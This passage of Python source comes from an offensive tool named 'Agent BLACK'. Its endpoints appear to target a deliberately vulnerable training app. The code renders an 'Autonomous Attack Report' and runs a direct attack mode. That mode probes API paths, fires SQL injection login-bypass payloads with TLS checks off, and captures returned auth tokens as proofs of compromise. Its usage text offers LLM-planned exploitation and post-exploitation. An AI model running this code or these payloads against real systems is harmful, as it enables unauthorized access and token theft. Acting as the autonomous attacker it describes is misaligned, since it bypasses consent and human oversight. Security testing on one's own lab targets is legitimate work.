    summary = data.get("summary", {})
    html = f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Agent BLACK Report</title>
    <style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0f0f1a,#1a1a2e,#16213e);color:#e0e0e0;min-height:100vh;padding:20px}}
    .container{{max-width:1200px;margin:0 auto}}.header{{background:linear-gradient(135deg,#1a1a2e,#0f3460);border-radius:15px;padding:30px;margin-bottom:30px;text-align:center}}
    .header h1{{font-size:2.5em;background:linear-gradient(90deg,#00d4ff,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}}
    .stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:30px}}
    .stat-card{{background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:10px;padding:20px;text-align:center;border:1px solid #2a2a4e}}
    .stat-card h2{{font-size:2em}}.critical{{color:#dc3545}}.medium{{color:#ffc107}}
    .section{{margin-bottom:30px}}.section h2{{color:#00d4ff;margin-bottom:20px;padding-bottom:10px;border-bottom:2px solid #2a2a4e}}
    code{{background:#0a0a0f;padding:2px 6px;border-radius:4px}}</style></head>
    <body><div class="container">
        <div class="header"><h1>🕵️ AGENT BLACK</h1><p style="color:#888;">Autonomous Attack Report</p>
            <p style="margin-top:15px;"><strong>Target:</strong> <code>{html_escape.escape(data.get("target",""))}</code></p>
            <p><strong>Timestamp:</strong> {data.get("timestamp","")}</p></div>
        <div class="stats">
            <div class="stat-card"><h2 class="critical">{summary.get("critical",0)}</h2><p>Critical</p></div>
            <div class="stat-card"><h2 class="medium">{summary.get("medium",0)}</h2><p>Medium</p></div>
            <div class="stat-card"><h2 style="color:#00ff00;">{summary.get("total",0)}</h2><p>Total</p></div>
            <div class="stat-card"><h2 style="color:#ff6b6b;">{len(data.get("proofs",[]))}</h2><p>Compromised</p></div>
        </div>
        {"<div class='section'><h2>🔓 Proofs of Compromise</h2>"+proofs_html+"</div>" if proofs_html else ""}
        <div class="section"><h2>🔍 Findings</h2>{findings_html if findings_html else "<p>No findings.</p>"}</div>
        <div style="text-align:center;padding:20px;color:#666;"><p>Generated by Agent BLACK - LANTERN Framework</p></div>
    </div></body></html>'''
    
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)


def run_direct_attack(target: str):
    import urllib3
    urllib3.disable_warnings()
    
    print(f"\n{'='*70}")
    print("  AGENT BLACK - DIRECT ATTACK MODE")
    print(f"{'='*70}")
    print(f"  Target: {target}")
    print(f"{'='*70}")
    
    findings = []
    proofs = []
    target = target.rstrip("/")
    
    print(f"\n[*] PHASE 1: RECONNAISSANCE")
    api_paths = ["/api", "/rest", "/api/v1", "/swagger.json", "/api-docs"]
    for path in api_paths:
        try:
            r = requests.get(f"{target}{path}", timeout=5, verify=False)
            if r.status_code in [200, 201, 401, 403]:
                print(f"    [+] Found: {path} ({r.status_code})")
        except:
            pass
    
    print(f"\n[*] PHASE 2: SQL INJECTION")
    payloads = auto_learner.get_best_payloads("sqli", limit=3) + ["' OR '1'='1", "' OR 1=1--", "admin'--"]
    login_endpoints = ["/rest/user/login", "/api/Users/login", "/login"]
    
    for endpoint in login_endpoints:
        print(f"    Testing: {endpoint}")
        for payload in payloads:
            try:
                r = requests.post(f"{target}{endpoint}", json={"email": payload, "password": payload}, 
                                headers={"Content-Type": "application/json"}, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    if data.get("authentication") or data.get("token"):
                        print(f"\n    [!!!] CRITICAL: SQL INJECTION SUCCESS!")
                        print(f"    [+] Payload: {payload}")
                        findings.append({"type": "sqli", "severity": "CRITICAL", "endpoint": endpoint, "payload": payload, "proof": data})
                        auto_learner.record_successful_payload("sqli", payload, target, endpoint)
                        if data.get("authentication", {}).get("token"):
                            proofs.append({"token": data["authentication"]["token"], "user": data["authentication"].get("umail")})
                        break
            except:
                pass
    
    print(f"\n[*] PHASE 3: API EXPOSURE")
    sensitive = ["/api/SecurityQuestions", "/api/Feedbacks", "/rest/memories", "/api/Challenges"]
    for ep in sensitive:
        try:
            r = requests.get(f"{target}{ep}", timeout=5, verify=False)
            if r.status_code == 200 and len(r.text) > 50:
                print(f"    [+] Exposed: {ep}")
                findings.append({"type": "api_exposure", "severity": "MEDIUM", "endpoint": ep})
        except:
            pass
    
    summary = {
        "critical": len([f for f in findings if f.get("severity") == "CRITICAL"]),
        "medium": len([f for f in findings if f.get("severity") == "MEDIUM"]),
        "total": len(findings)
    }
    
    print(f"\n{'='*70}")
    print("  ATTACK SUMMARY")
    print(f"{'='*70}")
    print(f"  Total findings: {summary['total']}")
    print(f"  Critical: {summary['critical']}")
    if proofs:
        print(f"  Auth tokens captured: {len(proofs)}")
    
    report_data = {
        "target": target,
        "timestamp": datetime.now().isoformat(),
        "findings": findings,
        "proofs": proofs,
        "summary": summary
    }
    
    reports_dir = Path(__file__).parent.parent.parent / "reports"
    reports_dir.mkdir(exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    json_path = reports_dir / f"agent_black_{timestamp}.json"
    with open(json_path, "w") as f:
        json.dump(report_data, f, indent=2)
    print(f"\n[+] JSON Report: {json_path}")
    
    html_path = reports_dir / f"agent_black_{timestamp}.html"
    generate_html_report(report_data, html_path)
    print(f"[+] HTML Report: {html_path}")
    
    return report_data


async def main():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    
    if len(args) < 1:
        print("""
AGENT BLACK - AUTONOMOUS MODE

Usage: python black_autonomous.py <target> [objective] [options]

Options:
  --attack  Full phased attack (Analyze -> Recon -> Exploit -> Post-Exploit)
  --fast    Quick direct exploitation
  --llm     Load local LLM for intelligent planning (slower)

Examples:
  python black_autonomous.py http://target.com --attack
  python black_autonomous.py http://target.com --fast
  python black_autonomous.py http://target.com "find SQL injection" --llm
""")
        return
    
    attack_mode = "--attack" in sys.argv
    fast_mode = "--fast" in sys.argv
    load_model = "--llm" in sys.argv
    
    target = args[0]
    objective = args[1] if len(args) > 1 else "Find and exploit vulnerabilities"
    
    if attack_mode:
        attacker = AgentBlackAttack(target)
        attacker.run()
    elif fast_mode:
        run_direct_attack(target)
    else:
        agent = AutonomousBlack(load_model=load_model)
        await agent.autonomous_loop(target, objective)


if __name__ == "__main__":
    asyncio.run(main())
